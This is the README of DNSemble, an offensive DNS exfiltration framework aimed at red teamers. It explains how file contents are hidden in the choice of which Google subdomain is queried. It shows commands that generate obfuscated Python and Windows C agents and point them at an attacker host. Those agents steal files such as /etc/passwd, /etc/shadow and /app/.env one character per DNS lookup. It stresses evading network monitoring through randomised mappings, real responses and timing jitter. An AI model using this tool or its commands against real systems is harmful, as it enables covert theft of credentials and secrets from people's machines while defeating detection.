# What is DNSemble? ![](https://img.shields.io/badge/python-3-blue)

DNSemble is an open-source project based on Python used to exfiltrate data using DNS.

DNSemble will create a malicious DNS server that handles DNS requests and decodes hidden data from the **choice of queried domain** rather than encoding data in subdomains or record contents. Each DNS query is a legitimate lookup to a well-known domain (e.g., `google.com`, `mail.google.com`, `drive.google.com`), and the server returns the **real IP address** — making the traffic indistinguishable from normal browsing.

DNSemble can generate a custom agent written in `Python` or `C` that will read a target file, resolve a sequence of domains to exfiltrate the data one character at a time, and deliver the stolen content to the attacker's DNS server.

You can edit the code of DNSemble agent as you wish, and build it using your own custom techniques.

The main goal of using DNSemble is to help red teamers/pentesters to exfiltrate data in a stealthy channel using DNS.

# How does it work?

DNSemble maps 98 well-known domains to 98 characters (95 printable ASCII plus `\n`, `\t`, `\r`). To exfiltrate a character, the client queries whichever domain currently maps to that character. The server sees the domain, looks up the character, and appends it to the reconstructed file.

For example, if the character `'S'` maps to `maps.google.com` in the current session, the client will send:

`A? maps.google.com`

The server decodes the character `'S'` from the domain choice, forwards the query to upstream DNS, and returns the **real IP address** of `maps.google.com`. To any network monitor, this is a completely normal DNS lookup.

The mapping between characters and domains is **randomized per session** using a 32-bit PRNG seed negotiated at session start. This means:

- Session 1: `'S'` -> `maps.google.com`
- Session 2: `'S'` -> `firebase.google.com`
- Session 3: `'S'` -> `colab.google.com`

An analyst comparing traffic from different exfiltration sessions sees completely different query patterns for the same data.

# DNSemble key features:

DNSemble has some key features such as:

* Exfiltrate data using the **choice of queried domain** — no encoded subdomains, no unusual records.
* Every DNS query is to a **real, well-known domain** and returns the **real IP address**.
* **Dynamic per-session mapping** — the char-to-domain permutation is randomized for every session.
* **98 Google subdomains** as the default domain pool — all queries look like normal Google API/service traffic.
* Pure agent written in `Python` with base64 obfuscation and the ability to customise it.
* Pure agent written in `C` for Windows targets with MinGW cross-compilation and the ability to customise it.
* The ability to embed target file paths directly into the agent.
* Configurable delay and jitter between each DNS request.
* Custom domain pool support — bring your own list of domains.
* Automatic chunking for files larger than 256 characters.
* Transaction ID encoding for multi-client multiplexing (up to 256 concurrent clients).

# Requirements

You can install DNSemble python requirements, which is zero — DNSemble uses **only the Python 3 standard library** (`socket`, `struct`, `random`, `argparse`).

No `pip install` needed.

If you want to generate Windows C agents, make sure to install `mingw-w64` via:

`apt install mingw-w64`

# Installation

To get the latest version of DNSemble, make sure to clone it from this repo using the following command:

`git clone https://github.com/mhaskar/DNSemble`

After that, you are ready to execute DNSemble to get the following:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py


    ____  _   _____                 __    __
   / __ \/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
 / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/

  DNS Exfiltration Framework  ·  v1.0
  The domain IS the data.  Dynamic mapping.

  Listen addr    0.0.0.0:5353
  Upstream DNS   8.8.8.8:53
  Loot dir       ./loot/
  Ctrl domain    googleapis.com
  Domain pool    98 domains  (mapping randomised per session)

[READY] Waiting for exfiltration sessions …
```

# Usage

To start using DNSemble, make sure your target machine is configured to use your DNSemble instance as its DNS server, or that you can redirect DNS traffic to it.

And you can check the options using `-h` switch like the following:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py -h
usage: DNSemble.py [-h] [--payloads] [--payload TYPE] [--host IP] [-a {x64,x86}]
                   [--jitter JITTER] [--delay DELAY] [-o FILE] [--files LIST]
                   [--domains FILE] [-p PORT] [-u UPSTREAM] [-l LOOT_DIR]

DNSemble — DNS exfiltration framework

options:
  -h, --help            show this help message and exit

payload generation:
  --payloads            List available payload types
  --payload TYPE        Generate a payload (name or number from --payloads)
  --host IP             Public IP/hostname the agent will connect to
  -a {x64,x86}, --arch {x64,x86}
                        Target architecture for Windows payloads (default x64)
  --jitter JITTER       Default jitter in ms baked into the agent (default 50)
  --delay DELAY         Default delay in ms baked into the agent (default 100)
  -o FILE, --output FILE
                        Output filename (default: auto-generated)
  --files LIST          Text file with target paths to embed (one per line)
  --domains FILE        Custom domain list file (default: data/domains.txt)

server mode:
  -p PORT, --port PORT  UDP listen port (default 5353)
  -u UPSTREAM, --upstream UPSTREAM
                        Upstream DNS resolver (default 8.8.8.8)
  -l LOOT_DIR, --loot-dir LOOT_DIR
                        Directory to save exfiltrated files (default ./loot)
```

* --host: The public IP address or hostname of the machine running DNSemble. This is baked into the generated agent.

* --payload: The DNSemble payload "agent" you want to generate based on the technique and programming language.

* --output: Output path to save the DNSemble agent.

* --delay: Delay between each DNS request in milliseconds (default 100ms).

* --jitter: Random ± jitter in milliseconds added to the delay (default 50ms).

* --files: A text file containing target file paths (one per line) to embed into the agent. The agent will automatically exfiltrate these files when executed.

* --domains: Custom domain list file to use instead of the default 98 Google subdomains.

* --arch: Target architecture for Windows C payloads (`x64` or `x86`).

* -p/--port: UDP port the DNS server listens on (default 5353, use 53 with root).

* -u/--upstream: Upstream DNS resolver for forwarding queries and returning real responses (default 8.8.8.8).

* -l/--loot-dir: Directory where exfiltrated files are saved (default ./loot).

## DNSemble Payloads

To check the available DNSemble payloads, you can use `python3 DNSemble.py --payloads` to get the following results:

```
askar•/opt/redteaming/DNSemble(main⚡)» python3 DNSemble.py --payloads

[+] 2 DNSemble payloads Available

  #  Payload                Description
  ─  ─────────────────────  ───────────────────────────────────────────────────────
  1  generic/python         Hardcoded domain list — 1 setup query (session negotiation only)
  2  windows/c              Hardcoded domain list — 1 setup query (session negotiation only)
```

## Example of using DNSemble

This example will generate a Python agent that connects to `10.0.0.1` on port `5353` with a delay of `200ms` and jitter of `100ms`:

`python3 DNSemble.py --payload generic/python --host 10.0.0.1 --delay 200 --jitter 100`

And the output will be:

```
    ____  _   _____                 __    __
   / __ \/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
 / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/

  DNS Exfiltration Framework  ·  v1.0
  The domain IS the data.  Dynamic mapping.

════════════════════════════════════════════════════════════
  PAYLOAD GENERATED
════════════════════════════════════════════════════════════
  Type       generic/python (Python 3 Agent)
  Server     10.0.0.1:5353
  Delay      200ms
  Jitter     ±100ms
  Domains    98 (baked into agent)
  Output     dnssemble_agent_10_0_0_1_5353.py
  Encoding   base64 + exec()
  Size       ... bytes
════════════════════════════════════════════════════════════

  Deploy on target and run:
    python3 dnssemble_agent_10_0_0_1_5353.py /etc/passwd
    python3 dnssemble_agent_10_0_0_1_5353.py secret.txt
```

Then you can deploy the generated agent on the target machine and execute it with the path to the file you want to exfiltrate. The agent will:

1. Negotiate a fresh session with a random seed
2. Build a randomized char-to-domain mapping
3. Send the hostname as AAAA queries
4. Send the filename as MX queries
5. Send the file content as A queries — one character per DNS lookup
6. Each query goes to a real, well-known domain and returns the real IP address

The server will decode the hidden data and save the exfiltrated file to the `loot/` directory.

## Example of using DNSemble with Windows C agent

This example will generate a Windows x64 C agent using MinGW cross-compilation:

`python3 DNSemble.py --payload windows/c --host 10.0.0.1 -o stealth.exe`

For x86 targets:

`python3 DNSemble.py --payload windows/c --host 10.0.0.1 -a x86 -o stealth.exe`

## Example of embedding target files

You can embed a list of target file paths directly into the agent so it automatically exfiltrates them upon execution:

```
echo "/etc/shadow" > targets.txt
echo "/app/.env" >> targets.txt
python3 DNSemble.py --payload generic/python --host 10.0.0.1 --files targets.txt
```

# How is DNSemble different?

Traditional DNS exfiltration tools encode data in **subdomains** — `c3VwZXJzZWNyZXQ.evil.com` — which is trivially detected by any DNS monitor looking for high-entropy labels or queries to suspicious domains.

DNSemble encodes data in the **choice** of domain, not the domain content:

| | Traditional DNS Exfil | DNSemble |
|---|---|---|
| **Query** | `encoded-data.evil.com` | `maps.google.com` |
| **Response** | Crafted/fake | Real IP address |
| **Domain** | Attacker-controlled | Well-known, legitimate |
| **Detection** | Easy (high-entropy subdomain) | Hard (normal-looking traffic) |
| **Encoding** | In the domain name itself | In which domain was chosen |

# Resources

* [DNSemble GitHub Repository](https://github.com/mhaskar/DNSemble)

# License

This project is licensed under the GPL-3.0 License - see the LICENSE file for details
